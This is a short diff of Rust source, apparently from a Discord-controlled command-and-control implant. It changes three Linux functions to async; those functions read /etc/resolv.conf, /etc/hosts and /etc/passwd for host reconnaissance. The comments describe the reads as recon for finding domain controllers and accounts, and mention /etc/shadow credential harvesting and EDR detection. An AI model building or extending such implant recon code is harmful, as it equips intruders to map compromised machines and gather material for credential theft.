@@ -57,7 +57,7 @@ pub async fn ip() -> Result<String, DiscordC2Error> {
 /// userspace software MUST be able to read /etc/resolv.conf, otherwise DNS resolution would be broken. this is always
 /// available.
 #[cfg(target_os = "linux")]
-pub fn get_resolv_conf() -> String {
+pub async fn get_resolv_conf() -> String {
     let resolv_conf = Path::new("/etc/resolv.conf");
     let file = fs::read_to_string(resolv_conf).unwrap_or("Unknown".to_string());
 
@@ -67,7 +67,7 @@ pub fn get_resolv_conf() -> String {
 /// /etc/hosts contains mappings of IP addresses to FQDNs. if the linux machine is domain joined, this will usually be
 /// populated with things like a DC hostname
 #[cfg(target_os = "linux")]
-pub fn get_etc_hosts() -> String {
+pub async fn get_etc_hosts() -> String {
     let hosts = Path::new("/etc/hosts");
     let file = fs::read_to_string(hosts).unwrap_or("Unknown".to_string());
 
@@ -78,7 +78,7 @@ pub fn get_etc_hosts() -> String {
 /// locked, the default HOME directories per account, the description of the accounts, their user ID, and group ID.
 /// warning: EDRs WILL detect any attempts at reading /etc/passwd for recon, just like /etc/shadow for cred harvesting
 #[cfg(target_os = "linux")]
-pub fn get_etc_passwd() -> String {
+pub async fn get_etc_passwd() -> String {
     let etc_passwd = Path::new("/etc/passwd");
     let file = fs::read_to_string(etc_passwd).unwrap_or("Unknown".to_string());
 
